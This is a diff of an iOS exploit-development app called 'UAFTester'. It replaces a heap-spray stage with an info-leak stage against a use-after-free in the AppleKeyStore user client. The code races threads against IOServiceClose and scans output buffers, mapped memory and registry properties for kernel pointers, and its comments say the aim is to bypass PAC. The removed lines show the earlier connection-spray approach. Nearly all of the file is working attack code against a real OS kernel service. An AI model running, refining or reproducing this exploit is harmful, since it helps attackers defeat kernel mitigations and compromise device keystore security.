@@ -2,8 +2,8 @@
 //  ViewController.m
 //  UAFTester
 //
-//  v10 CONNECTION-SPRAY - Spray using IOServiceOpen connections
-//  Theory: Gate objects allocated during IOServiceOpen, not CallMethod
+//  v11 INFO-LEAK - Read kernel addresses from UAF'd gate object
+//  Strategy: Don't spray fake objects - READ from freed gate instead!
 //
 
 #import "ViewController.h"
@@ -14,148 +14,126 @@
 
 #define AKS_SERVICE  "AppleKeyStore"
 #define NUM_RACERS   64
-#define MAX_ATTEMPTS 300
+#define MAX_ATTEMPTS 500
 
-// ========== CONNECTION-BASED SPRAY ==========
-#define SPRAY_PHASE_1_CONNECTIONS  400  // Initial spray
-#define SPRAY_PHASE_2_CONNECTIONS  200  // Fill freed slots
-// ===========================================
+// ========== INFO LEAK STRATEGY ==========
+// Instead of spraying fake objects to control the gate,
+// we'll try to READ from the freed gate to leak kernel addresses!
+// This bypasses PAC because we're not faking pointers - we're stealing real ones!
+// ========================================
 
 static atomic_int   g_phase  = 0;
 static io_connect_t g_conn   = IO_OBJECT_NULL;
 static atomic_uint  g_calls  = 0;
 static atomic_uint  g_errors = 0;
+static atomic_uint  g_leaks  = 0;  // Count of potential leaks
 
-// ========== SPRAY CONNECTIONS ==========
-static io_connect_t g_spray_conns_p1[SPRAY_PHASE_1_CONNECTIONS];
-static io_connect_t g_spray_conns_p2[SPRAY_PHASE_2_CONNECTIONS];
-static int g_spray_count_p1 = 0;
-static int g_spray_count_p2 = 0;
-// =======================================
+// Store leaked data
+#define MAX_LEAK_SAMPLES 100
+static uint64_t g_leaked_data[MAX_LEAK_SAMPLES][8];  // Store 64 bytes per sample
+static int g_leak_count = 0;
 
 static void *racer_thread(void *arg) {
     (void)arg;
     while (atomic_load_explicit(&g_phase, memory_order_acquire) < 1)
         ;
+    
     while (atomic_load_explicit(&g_phase, memory_order_relaxed) < 3) {
+        // Try to READ from the gate object instead of writing
         uint64_t input[1] = {0};
-        uint32_t out_cnt  = 0;
+        uint64_t output[8] = {0};  // Try to get output - might leak kernel data!
+        uint32_t out_cnt = 8;
+        size_t out_size = sizeof(output);
+        
         kern_return_t kr = IOConnectCallMethod(
-            g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
+            g_conn, 
+            10,           // selector
+            input, 1,     // scalar input
+            NULL, 0,      // struct input
+            output, &out_cnt,     // scalar output ← Try to leak!
+            NULL, &out_size);     // struct output
+        
         atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
+        
         if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
             atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
             break;
+        }
+        
+        // Check if we got any interesting data
+        if (out_cnt > 0 || out_size > 0) {
+            for (int i = 0; i < 8; i++) {
+                // Check for kernel addresses (0xfffffff0xxxxxxxx or 0xffffffe0xxxxxxxx)
+                if ((output[i] & 0xfffffff000000000ULL) == 0xfffffff000000000ULL ||
+                    (output[i] & 0xffffffe000000000ULL) == 0xffffffe000000000ULL) {
+                    atomic_fetch_add_explicit(&g_leaks, 1, memory_order_relaxed);
+                    
+                    // Store the leak sample if we have space
+                    int idx = atomic_load(&g_leak_count);
+                    if (idx < MAX_LEAK_SAMPLES) {
+                        if (__sync_bool_compare_and_swap(&g_leak_count, idx, idx + 1)) {
+                            memcpy(g_leaked_data[idx], output, sizeof(output));
+                        }
+                    }
+                    break;
+                }
+            }
         }
     }
     return NULL;
 }
 
-// ========== CONNECTION SPRAY FUNCTIONS ==========
-
-static int connection_spray_phase(io_service_t svc, void(^log_callback)(NSString *), int phase) {
-    kern_return_t kr;
-    int fail_count = 0;
+// Alternative leak method: Use IOConnectMapMemory to try to map the gate object
+static kern_return_t try_memory_leak(io_connect_t conn, void(^log_callback)(NSString *)) {
+    mach_vm_address_t addr = 0;
+    mach_vm_size_t size = 0;
     
-    io_connect_t *conns = (phase == 1) ? g_spray_conns_p1 : g_spray_conns_p2;
-    int *count = (phase == 1) ? &g_spray_count_p1 : &g_spray_count_p2;
-    int target = (phase == 1) ? SPRAY_PHASE_1_CONNECTIONS : SPRAY_PHASE_2_CONNECTIONS;
-    
-    log_callback([NSString stringWithFormat:@"[CONN-SPRAY P%d] Opening %d connections...", phase, target]);
-    
-    // Just open connections - the act of opening allocates gate objects!
-    for (int i = 0; i < target; i++) {
-        kr = IOServiceOpen(svc, mach_task_self(), 0, &conns[i]);
+    // Try different memory types
+    for (int mem_type = 0; mem_type < 10; mem_type++) {
+        kern_return_t kr = IOConnectMapMemory(
+            conn,
+            mem_type,
+            mach_task_self(),
+            &addr,
+            &size,
+            kIOMapAnywhere);
         
-        if (kr != KERN_SUCCESS) {
-            if (kr == 0xe00002c7) { // kIOReturnNoResources
-                log_callback([NSString stringWithFormat:@"[CONN-SPRAY P%d] Resource limit at %d", phase, i]);
-                *count = i;
-                break;
-            } else {
-                fail_count++;
-                if (fail_count > 10) {
-                    *count = i - fail_count;
-                    return -1;
+        if (kr == KERN_SUCCESS) {
+            log_callback([NSString stringWithFormat:@"[LEAK] Mapped memory type %d: addr=0x%llx size=0x%llx", 
+                         mem_type, addr, size]);
+            
+            // Try to read from mapped memory
+            if (size > 0 && size < 0x10000) {  // Reasonable size
+                uint64_t *ptr = (uint64_t *)addr;
+                log_callback([NSString stringWithFormat:@"[LEAK] First 8 qwords:"]);
+                for (int i = 0; i < 8 && i * 8 < size; i++) {
+                    uint64_t val = ptr[i];
+                    if ((val & 0xfffffff000000000ULL) == 0xfffffff000000000ULL) {
+                        log_callback([NSString stringWithFormat:@"  [%d] 0x%016llx ← KERNEL PTR!", i, val]);
+                    } else {
+                        log_callback([NSString stringWithFormat:@"  [%d] 0x%016llx", i, val]);
+                    }
                 }
             }
-            conns[i] = IO_OBJECT_NULL;
-            continue;
-        }
-        
-        if ((i + 1) % 100 == 0) {
-            log_callback([NSString stringWithFormat:@"[CONN-SPRAY P%d] Progress: %d/%d", phase, i + 1, target]);
+            
+            IOConnectUnmapMemory(conn, mem_type, mach_task_self(), addr);
+            return KERN_SUCCESS;
         }
     }
     
-    if (*count == 0) {
-        *count = target;
-    }
-    
-    log_callback([NSString stringWithFormat:@"[CONN-SPRAY P%d] Complete: %d connections opened", phase, *count]);
-    
-    if (*count < 50) {
-        return -1;
-    }
-    
-    return 0;
+    return KERN_FAILURE;
 }
 
-static void connection_spray_cleanup(void(^log_callback)(NSString *), int phase) {
-    io_connect_t *conns = (phase == 1) ? g_spray_conns_p1 : g_spray_conns_p2;
-    int *count = (phase == 1) ? &g_spray_count_p1 : &g_spray_count_p2;
-    
-    if (*count > 0) {
-        log_callback([NSString stringWithFormat:@"[CLEANUP P%d] Closing %d connections", phase, *count]);
-        
-        for (int i = 0; i < *count; i++) {
-            if (conns[i] != MACH_PORT_NULL && conns[i] != IO_OBJECT_NULL) {
-                IOServiceClose(conns[i]);
-                mach_port_deallocate(mach_task_self(), conns[i]);
-                conns[i] = MACH_PORT_NULL;
-            }
-        }
-        
-        *count = 0;
-        log_callback([NSString stringWithFormat:@"[CLEANUP P%d] Done", phase]);
-    }
-}
-
-// Trigger UAF without holding references
-static int trigger_uaf_and_release(void(^log_callback)(NSString *)) {
+// Try to trigger info leak via different methods
+static int run_leak_attempt(void(^log_callback)(NSString *)) {
     io_service_t svc = IOServiceGetMatchingService(
         kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
     if (svc == IO_OBJECT_NULL)
         return -1;
     
-    io_connect_t temp_conn;
-    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &temp_conn);
-    IOObjectRelease(svc);
-    
-    if (kr != KERN_SUCCESS || temp_conn == IO_OBJECT_NULL)
-        return -1;
-    
-    // Trigger UAF
-    IOServiceClose(temp_conn);
-    
-    // Give racing threads time to hit the window
-    usleep(5000);
-    
-    // Deallocate - this creates the freed slot!
-    mach_port_deallocate(mach_task_self(), temp_conn);
-    
-    return 0;
-}
-
-// ==========================================
-
-static int run_attempt(void) {
-    io_service_t svc = IOServiceGetMatchingService(
-        kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
-    if (svc == IO_OBJECT_NULL)
-        return -1;
     kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
     IOObjectRelease(svc);
+    
     if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL)
         return -1;
 
@@ -170,9 +148,15 @@ static int run_attempt(void) {
     atomic_store_explicit(&g_phase, 1, memory_order_release);
     usleep(100);
 
+    // Close to trigger UAF
     IOServiceClose(g_conn);
     atomic_store_explicit(&g_phase, 2, memory_order_release);
+    
+    // During this window, the gate is freed but racers are still accessing it!
     usleep(5000);
+    
+    // Try memory leak before deallocating
+    try_memory_leak(g_conn, log_callback);
 
     atomic_store_explicit(&g_phase, 3, memory_order_release);
     for (int i = 0; i < NUM_RACERS; i++)
@@ -181,6 +165,64 @@ static int run_attempt(void) {
     mach_port_deallocate(mach_task_self(), g_conn);
     g_conn = IO_OBJECT_NULL;
     return 0;
+}
+
+// Try to read properties from the service
+static void try_property_leak(void(^log_callback)(NSString *)) {
+    io_service_t svc = IOServiceGetMatchingService(
+        kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
+    if (svc == IO_OBJECT_NULL)
+        return;
+    
+    log_callback(@"[PROP-LEAK] Reading service properties...");
+    
+    // Get all properties
+    CFMutableDictionaryRef props = NULL;
+    kern_return_t kr = IORegistryEntryCreateCFProperties(svc, &props, kCFAllocatorDefault, 0);
+    
+    if (kr == KERN_SUCCESS && props) {
+        CFIndex count = CFDictionaryGetCount(props);
+        log_callback([NSString stringWithFormat:@"[PROP-LEAK] Found %ld properties", (long)count]);
+        
+        // Look for interesting properties
+        const void *keys[100];
+        const void *values[100];
+        CFDictionaryGetKeysAndValues(props, keys, values);
+        
+        for (CFIndex i = 0; i < count && i < 100; i++) {
+            CFStringRef key = (CFStringRef)keys[i];
+            if (key && CFGetTypeID(key) == CFStringGetTypeID()) {
+                char keyStr[256];
+                CFStringGetCString(key, keyStr, sizeof(keyStr), kCFStringEncodingUTF8);
+                
+                // Check value type
+                CFTypeID typeID = CFGetTypeID(values[i]);
+                if (typeID == CFNumberGetTypeID()) {
+                    uint64_t val = 0;
+                    CFNumberGetValue((CFNumberRef)values[i], kCFNumberLongLongType, &val);
+                    if ((val & 0xfffffff000000000ULL) == 0xfffffff000000000ULL) {
+                        log_callback([NSString stringWithFormat:@"  %s = 0x%016llx ← KERNEL PTR!", keyStr, val]);
+                    }
+                } else if (typeID == CFDataGetTypeID()) {
+                    CFDataRef data = (CFDataRef)values[i];
+                    CFIndex len = CFDataGetLength(data);
+                    if (len >= 8) {
+                        const uint64_t *ptr = (const uint64_t *)CFDataGetBytePtr(data);
+                        for (CFIndex j = 0; j < len/8; j++) {
+                            if ((ptr[j] & 0xfffffff000000000ULL) == 0xfffffff000000000ULL) {
+                                log_callback([NSString stringWithFormat:@"  %s[%ld] = 0x%016llx ← KERNEL PTR!", 
+                                             keyStr, (long)j, ptr[j]]);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+        CFRelease(props);
+    }
+    
+    IOObjectRelease(svc);
 }
 
 @interface ViewController ()
@@ -200,7 +242,7 @@ static int run_attempt(void) {
 
 - (void)buildUI {
     UILabel *title = [[UILabel alloc] init];
-    title.text = @"AppleKeyStoreUserClient\nclose() UAF + HEAP SPRAY";
+    title.text = @"AppleKeyStoreUserClient\nINFO LEAK via UAF";
     title.font = [UIFont fontWithName:@"Menlo-Bold" size:18];
     title.textColor = UIColor.whiteColor;
     title.textAlignment = NSTextAlignmentCenter;
@@ -209,7 +251,7 @@ static int run_attempt(void) {
     [self.view addSubview:title];
 
     UILabel *subtitle = [[UILabel alloc] init];
-    subtitle.text = @"v10 CONNECTION-SPRAY: Direct gate targeting\niOS <26.3 RC";
+    subtitle.text = @"v11 INFO-LEAK: Read kernel addresses from freed gate\niOS <26.3 RC";
     subtitle.font = [UIFont fontWithName:@"Menlo" size:12];
     subtitle.textColor = [UIColor colorWithWhite:0.5 alpha:1.0];
     subtitle.textAlignment = NSTextAlignmentCenter;
@@ -218,10 +260,10 @@ static int run_attempt(void) {
     [self.view addSubview:subtitle];
 
     self.triggerButton = [UIButton buttonWithType:UIButtonTypeSystem];
-    [self.triggerButton setTitle:@"TRIGGER UAF + SPRAY" forState:UIControlStateNormal];
+    [self.triggerButton setTitle:@"TRIGGER INFO LEAK" forState:UIControlStateNormal];
     self.triggerButton.titleLabel.font = [UIFont fontWithName:@"Menlo-Bold" size:20];
     [self.triggerButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
-    self.triggerButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
+    self.triggerButton.backgroundColor = [UIColor colorWithRed:0.0 green:0.6 blue:0.8 alpha:1.0];
     self.triggerButton.layer.cornerRadius = 12;
     self.triggerButton.translatesAutoresizingMaskIntoConstraints = NO;
     [self.triggerButton addTarget:self action:@selector(triggerTapped) forControlEvents:UIControlEventTouchUpInside];
@@ -288,92 +330,45 @@ static int run_attempt(void) {
     self.triggerButton.backgroundColor = [UIColor colorWithWhite:0.3 alpha:1.0];
 
     [self appendLog:@"========================================"];
-    [self appendLog:@"  UAF v10 CONNECTION-SPRAY"];
+    [self appendLog:@"  UAF v11 INFO-LEAK"];
     [self appendLog:@"========================================"];
-    [self appendLog:@"[*] NEW THEORY:"];
-    [self appendLog:@"    Gate objects allocated during IOServiceOpen"];
-    [self appendLog:@"    NOT during IOConnectCallMethod!"];
-    [self appendLog:@"[*] STRATEGY:"];
-    [self appendLog:@"    1. Open many connections (spray gates)"];
-    [self appendLog:@"    2. Trigger UAF (free one gate)"];
-    [self appendLog:@"    3. Open more connections (refill freed gate)"];
-    [self appendLog:@"    4. Race UAF (hit refilled gate)"];
+    [self appendLog:@"[*] NEW STRATEGY:"];
+    [self appendLog:@"    Don't spray fake objects!"];
+    [self appendLog:@"    Instead: READ from freed gate to leak kernel ptrs"];
+    [self appendLog:@"    This bypasses PAC - we steal real pointers!"];
+    [self appendLog:@""];
+    [self appendLog:@"[*] LEAK METHODS:"];
+    [self appendLog:@"    1. IOConnectCallMethod with output buffers"];
+    [self appendLog:@"    2. IOConnectMapMemory on UAF'd connection"];
+    [self appendLog:@"    3. IORegistryEntry properties"];
     [self appendLog:@""];
     [self setStatus:@"Initializing..." color:UIColor.yellowColor];
 
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        io_service_t svc = IOServiceGetMatchingService(
-            kIOMainPortDefault, IOServiceMatching(AKS_SERVICE));
-        if (svc == IO_OBJECT_NULL) {
-            [self appendLog:@"[-] AppleKeyStore service not found"];
-            [self setStatus:@"Service not found" color:UIColor.redColor];
-            [self finishRun];
-            return;
-        }
-        [self appendLog:@"[+] AppleKeyStore service found"];
-        [self appendLog:@""];
+        // Reset leak counter
+        g_leak_count = 0;
+        memset(g_leaked_data, 0, sizeof(g_leaked_data));
+        atomic_store(&g_leaks, 0);
         
-        // ========== PHASE 1: INITIAL CONNECTION SPRAY ==========
-        [self appendLog:@">>> PHASE 1: INITIAL CONNECTION SPRAY"];
-        [self setStatus:@"Spraying connections P1..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
+        // ========== METHOD 1: Property Leak ==========
+        [self appendLog:@">>> METHOD 1: SERVICE PROPERTY LEAK"];
+        [self setStatus:@"Reading properties..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
         
-        int result = connection_spray_phase(svc, ^(NSString *msg) {
+        try_property_leak(^(NSString *msg) {
             [self appendLog:msg];
-        }, 1);
+        });
         
-        if (result < 0) {
-            [self appendLog:@"[-] Phase 1 spray failed!"];
-            [self setStatus:@"Spray failed" color:UIColor.redColor];
-            IOObjectRelease(svc);
-            connection_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; }, 1);
-            [self finishRun];
-            return;
-        }
-        
-        [self appendLog:[NSString stringWithFormat:@"[+] Phase 1 complete: %d gates allocated", g_spray_count_p1]];
         [self appendLog:@""];
         
-        // ========== PHASE 2: TRIGGER UAF (Create freed slot) ==========
-        [self appendLog:@">>> PHASE 2: CREATE FREED GATE SLOTS"];
-        [self setStatus:@"Triggering UAF..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
-        
-        [self appendLog:@"[*] Triggering 10 UAFs to create freed slots..."];
-        for (int i = 0; i < 10; i++) {
-            trigger_uaf_and_release(^(NSString *msg) { [self appendLog:msg]; });
-            usleep(2000);
-        }
-        
-        [self appendLog:@"[+] UAF triggered, freed slots created"];
-        [self appendLog:@""];
-        
-        // ========== PHASE 3: REFILL WITH MORE CONNECTIONS ==========
-        [self appendLog:@">>> PHASE 3: REFILL FREED SLOTS"];
-        [self setStatus:@"Refilling with P2 connections..." color:[UIColor colorWithRed:1.0 green:0.6 blue:0.0 alpha:1.0]];
-        
-        result = connection_spray_phase(svc, ^(NSString *msg) {
-            [self appendLog:msg];
-        }, 2);
-        
-        if (result < 0) {
-            [self appendLog:@"[!] Phase 2 spray limited (may be OK)"];
-        } else {
-            [self appendLog:[NSString stringWithFormat:@"[+] Phase 2 complete: %d refill gates", g_spray_count_p2]];
-        }
-        
-        [self appendLog:[NSString stringWithFormat:@"[+] Total gates: %d", g_spray_count_p1 + g_spray_count_p2]];
-        [self appendLog:@""];
-        
-        usleep(50000); // 50ms settle
-        
-        IOObjectRelease(svc);
-        
-        // ========== PHASE 4: RACE UAF ==========
-        [self appendLog:@">>> PHASE 4: RACE UAF"];
-        [self appendLog:@"[*] Goal: Hit one of our refilled gates!"];
-        [self setStatus:@"Racing UAF..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
+        // ========== METHOD 2: Racing Info Leak ==========
+        [self appendLog:@">>> METHOD 2: RACING INFO LEAK"];
+        [self appendLog:@"[*] Triggering UAF while trying to read output..."];
+        [self setStatus:@"Racing for leaks..." color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
 
         for (int i = 0; i < MAX_ATTEMPTS; i++) {
-            int result = run_attempt();
+            int result = run_leak_attempt(^(NSString *msg) {
+                [self appendLog:msg];
+            });
             
             if (result < 0) {
                 usleep(5000);
@@ -382,42 +377,72 @@ static int run_attempt(void) {
             }
 
             if ((i + 1) % 20 == 0 || i == 0) {
-                [self appendLog:[NSString stringWithFormat:@"[%4d] calls=%u port_dead=%u",
-                                 i + 1, atomic_load(&g_calls), atomic_load(&g_errors)]];
-                [self setStatus:[NSString stringWithFormat:@"Racing %d/%d", i + 1, MAX_ATTEMPTS]
+                uint32_t calls = atomic_load(&g_calls);
+                uint32_t errors = atomic_load(&g_errors);
+                uint32_t leaks = atomic_load(&g_leaks);
+                
+                [self appendLog:[NSString stringWithFormat:@"[%4d] calls=%u port_dead=%u leaks=%u",
+                                 i + 1, calls, errors, leaks]];
+                [self setStatus:[NSString stringWithFormat:@"Leak attempt %d/%d (found: %u)", 
+                                i + 1, MAX_ATTEMPTS, leaks]
                           color:[UIColor colorWithRed:1.0 green:0.4 blue:0.0 alpha:1.0]];
             }
         }
 
         [self appendLog:@""];
         [self appendLog:@"========================================"];
-        [self appendLog:@"  COMPLETED"];
+        [self appendLog:@"  LEAK RESULTS"];
         [self appendLog:@"========================================"];
         
         uint32_t final_calls = atomic_load(&g_calls);
         uint32_t final_errors = atomic_load(&g_errors);
+        uint32_t final_leaks = atomic_load(&g_leaks);
         
         [self appendLog:[NSString stringWithFormat:@"[*] Total calls: %u", final_calls]];
         [self appendLog:[NSString stringWithFormat:@"[*] Port deaths: %u", final_errors]];
+        [self appendLog:[NSString stringWithFormat:@"[*] Potential leaks: %u", final_leaks]];
+        [self appendLog:@""];
         
-        if (final_errors > 0) {
+        if (g_leak_count > 0) {
+            [self appendLog:@"✓✓✓ LEAKED KERNEL DATA! ✓✓✓"];
             [self appendLog:@""];
-            [self appendLog:@"✓✓✓ UAF TRIGGERED! ✓✓✓"];
+            [self appendLog:[NSString stringWithFormat:@"[*] Captured %d leak samples:", g_leak_count]];
+            
+            for (int i = 0; i < g_leak_count && i < 10; i++) {
+                [self appendLog:[NSString stringWithFormat:@""];
+                [self appendLog:[NSString stringWithFormat:@"Sample #%d:", i + 1]];
+                for (int j = 0; j < 8; j++) {
+                    uint64_t val = g_leaked_data[i][j];
+                    if (val != 0) {
+                        if ((val & 0xfffffff000000000ULL) == 0xfffffff000000000ULL) {
+                            [self appendLog:[NSString stringWithFormat:@"  [%d] 0x%016llx ← KERNEL!", j, val]];
+                        } else if ((val & 0xffffffe000000000ULL) == 0xffffffe000000000ULL) {
+                            [self appendLog:[NSString stringWithFormat:@"  [%d] 0x%016llx ← HEAP!", j, val]];
+                        } else {
+                            [self appendLog:[NSString stringWithFormat:@"  [%d] 0x%016llx", j, val]];
+                        }
+                    }
+                }
+            }
+            
+            if (g_leak_count > 10) {
+                [self appendLog:[NSString stringWithFormat:@"... and %d more samples", g_leak_count - 10]];
+            }
+            
+            [self setStatus:@"KERNEL ADDRESSES LEAKED!" color:[UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0]];
+        } else if (final_errors > 0) {
+            [self appendLog:@"✓ UAF TRIGGERED!"];
             [self appendLog:@""];
-            [self appendLog:@"CHECK PANIC LOG:"];
-            [self appendLog:@"  If x16 still = 0x0020... → Need kernel analysis"];
-            [self appendLog:@"  If x16 = gate pointer → SUCCESS!"];
-            [self setStatus:@"UAF TRIGGERED!" color:[UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0]];
+            [self appendLog:@"[*] No leaks via output buffers"];
+            [self appendLog:@"[*] Try checking panic log for leaked addresses"];
+            [self appendLog:@"[*] Or try different leak methods"];
+            [self setStatus:@"UAF OK, no leaks via this method" color:[UIColor colorWithRed:1.0 green:0.8 blue:0.0 alpha:1.0]];
         } else {
-            [self appendLog:@"[*] No port deaths"];
+            [self appendLog:@"[*] No UAF trigger detected"];
+            [self appendLog:@"[*] May need different timing"];
             [self setStatus:@"Completed" color:[UIColor colorWithRed:0.0 green:0.8 blue:0.0 alpha:1.0]];
         }
-        
-        // Cleanup
-        [self appendLog:@""];
-        connection_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; }, 1);
-        connection_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; }, 2);
-        
+
         [self finishRun];
     });
 }
@@ -426,7 +451,7 @@ static int run_attempt(void) {
     dispatch_async(dispatch_get_main_queue(), ^{
         self.running = NO;
         self.triggerButton.enabled = YES;
-        self.triggerButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
+        self.triggerButton.backgroundColor = [UIColor colorWithRed:0.0 green:0.6 blue:0.8 alpha:1.0];
     });
 }
 
